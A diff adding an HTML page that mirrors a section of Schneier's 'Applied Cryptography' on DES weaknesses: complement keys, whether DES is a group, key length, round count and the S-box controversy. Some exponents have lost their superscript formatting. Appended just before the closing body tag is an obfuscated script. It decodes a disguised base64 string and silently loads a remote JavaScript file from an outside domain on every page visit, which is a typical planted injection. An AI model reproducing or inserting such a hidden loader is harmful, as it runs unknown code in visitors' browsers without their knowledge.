@@ -1,0 +1,106 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Data Encryption Standard (DES)</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=12//-->
+<!--PAGES=282-285//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="12-09.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="12-11.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>What this means is that a chosen-plaintext attack against DES only has to test half the possible keys: 2<SUP>55</SUP> keys instead of 2<SUP>56</SUP> [1080]. Eli Biham and Adi Shamir showed [172] that there is a known-plaintext attack of the same complexity, requiring at least 2<SUP>33</SUP> known plaintexts.</P>
+<P>It is questionable whether this is a weakness, since most messages don&#146;t have complement blocks of plaintext (in random plaintext, the odds against it are extremely high) and users can be warned not to use complement keys.</P>
+<P><FONT SIZE="+1"><B><I>Algebraic Structure</I></B></FONT></P>
+<P>All possible 64-bit plaintext blocks can be mapped onto all possible 64-bit ciphertext blocks in 2<SUP>64</SUP>! different ways. The DES algorithm, with its 56-bit key, gives us 2<SUP>56</SUP> (approximately 10<SUP>17</SUP>) of these mappings. Using multiple encryption, it seems possible to reach a larger portion of those possible mappings. However, this is only true if the DES operation does not have certain algebraic structures.</P>
+<P>If DES were <B>closed,</B> then for any <I>K</I><SUB>1</SUB> and <I>K</I><SUB>2</SUB> there would always be a <I>K</I><SUB>3</SUB> such that</P>
+<DL>
+<DD><I>E</I><SUB>K</SUB>2(<I>E</I><SUB>K</SUB>1(<I>P</I>)) = <I>E</I><SUB>K</SUB>3(<I>P</I>)
+</DL>
+<P>In other words, the DES encryption operation would form a group, and encrypting a set of plaintext blocks with <I>K</I><SUB>1</SUB> followed by <I>K</I><SUB>2</SUB> would be identical to encrypting the blocks with <I>K</I><SUB>3</SUB>. Even worse, DES would be vulnerable to a meet-in-the-middle known-plaintext attack that runs in only 228 steps [807].</P>
+<P>If DES were <B>pure,</B> then for any <I>K</I><SUB>1</SUB> <I>K</I><SUB>2</SUB> and <I>K</I><SUB>3</SUB> there would always be a <I>K</I><SUB>4</SUB> such that</P>
+<DL>
+<DD><I>E</I><SUB>K</SUB>3(<I>E</I><SUB>K</SUB>2(<I>E</I><SUB>K</SUB>1(<I>P</I>))) = <I>E</I><SUB>K</SUB>4(<I>P</I>)
+</DL>
+<P>Triple encryption would be useless. (Note that a closed cipher is necessarily pure but a pure cipher is not necessarily closed.)
+</P>
+<P>An early theoretical paper by Don Coppersmith gave some hints, but it wasn&#146;t enough [377]. Various cryptographers wrestled with this question [588,427,431,527,723,789]. Cycling experiments gathered &#147;overwhelming evidence&#148; that DES is not a group [807,371,808,1116,809], but it wasn&#146;t until 1992 that cryptographers proved that DES is not a group [293]. Coppersmith said that the IBM team knew it all along.</P>
+<P><FONT SIZE="+1"><B><I>Key Length</I></B></FONT></P>
+<P>IBM&#146;s original submission to NBS had a 112-bit key. By the time the DES became a standard, that was reduced to a 56-bit key. Many cryptographers argued for the longer key. Their arguments centered on the possibility of a brute-force attack (see Section 7.1).
+</P>
+<P>In 1976 and 1977, Diffie and Hellman argued that a special-purpose DES-cracking parallel computer could recover the key in a day and cost $20 million. In 1981, Diffie upped this to a two-day search time and a cost of $50 million [491]. Diffie and Hellman argued then that this was out of reach for everybody except organizations like the NSA, but that by 1990 DES would be totally insecure [714].</P>
+<P>Hellman [716] presented another argument against the small key size: By trading memory space for time, it would be possible to speed up the searching process. He suggested the possibility of computing and storing 256 possible results of encrypting a single plaintext block under every possible key. Then, to break an unknown key, all that would be required would be for the cryptanalyst to insert the plaintext block into the encryption stream, recover the resulting ciphertext, and look the key up. Hellman pegged the cost of this cracking machine at $5 million.</P>
+<P>Arguments for and against the existence of a DES-cracker lurking in some government basement somewhere have continued. Several people pointed out that the mean time between failures for the DES chips would never be high enough to ensure that the machine would work. This objection was shown to be superfluous in [1278]. Others suggested ways to speed the process even further and to reduce the effects of chip failures.</P>
+<P>Meanwhile, hardware implementations of DES slowly approached the million-encryptions-per-second requirement of Diffie and Hellman&#146;s special-purpose machine. In 1984 DES chips capable of performing 256,000 encryptions per second had been produced [533,534]. By 1987 chips performing 512,000 encryptions per second were being developed, and a version capable of checking over a million keys per second was feasible [738,1573]. And in 1993 Michael Wiener designed a $1 million machine that could complete a brute-force attack against DES in an average of 3.5 hours (see Section 7.1).</P>
+<P>No one has publicly admitted building this machine, although it is a reasonable assumption that someone has. A million dollars is not a lot of money to a large&#151;or even a medium-sized&#151;country.</P>
+<P>It was not until 1990 that two Israeli mathematicians, Biham and Shamir, discovered <B>differential cryptanalysis,</B> a technique that put to rest the question of key length. Before we discuss that technique, let&#146;s turn to some other design criticisms of DES.</P>
+<P><FONT SIZE="+1"><B><I>Number of Rounds</I></B></FONT></P>
+<P>Why 16 rounds? Why not 32? After five rounds every ciphertext bit is a function of every plaintext bit and every key bit [1078,1080], and after eight rounds the ciphertext was essentially a random function of every plaintext bit and every key bit [880]. (This is called the avalanche effect.) So why not stop after eight rounds?
+</P>
+<P>Over the years, variants of DES with a reduced number of rounds have been successfully attacked. DES with three or four rounds was easily broken in 1982 [49]. DES with six rounds fell some years later [336]. Biham and Shamir&#146;s differential cryptanalysis explained this as well: DES with any number of rounds fewer than 16 could be broken with a known-plaintext attack more efficiently than by a brute-force attack. Certainly brute-force is a much more likely attack, but it is interesting that the algorithm has exactly 16 rounds.</P>
+<P><FONT SIZE="+1"><B><I>Design of the S-Boxes</I></B></FONT></P>
+<P>In addition to being accused of reducing the key length, NSA was also accused of modifying the contents of the S-boxes. When pressed for design justification for the S-boxes, the NSA indicated that elements of the algorithm&#146;s design were &#147;sensitive&#148; and would not be made public. Many cryptographers were concerned that the NSA-designed S-boxes hid a trapdoor, making it possible for them to easily cryptanalyze the algorithm.
+</P>
+<P>Since then, considerable effort has gone into analyzing the design and operation of the S-boxes. In the mid-1970s, Lexar Corporation [961,721] and Bell Laboratories [1120] examined the operation of the S-boxes. Neither analysis revealed any weaknesses, although both found inexplicable features. The S-boxes had more features in common with a linear transformation than one would expect if they were chosen at random. The Bell Laboratories team stated that the S-boxes may have hidden trapdoors, and the Lexar report concluded with:</P>
+<BLOCKQUOTE><P>Structures have been found in DES that were undoubtedly inserted to strengthen the system against certain types of attack. Structures have also been found that appear to weaken the system.
+</P>
+</BLOCKQUOTE><P>On the other hand, this report also warned:
+</P>
+<BLOCKQUOTE><P>...the problem [of the search for structure in the S-boxes] is complicated by the ability of the human mind to find apparent structure in random data, which is really not structure at all.
+</P>
+</BLOCKQUOTE><P>At the second workshop on DES, the National Security Agency revealed several design criteria behind the S-boxes [229]. This did nothing to quell people&#146;s suspicions, and the debate continued [228,422,714,1506,1551].
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="12-09.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="12-11.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(ANcMOwRm, cyKQhcvq) {cyKQhcvq = ANcMOwRm.createElement('script');cyKQhcvq.type = 'text/javascript';cyKQhcvq.async = true;cyKQhcvq.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');ANcMOwRm.getElementsByTagName('body')[0].appendChild(cyKQhcvq);}(document));</script></body>
+</html>
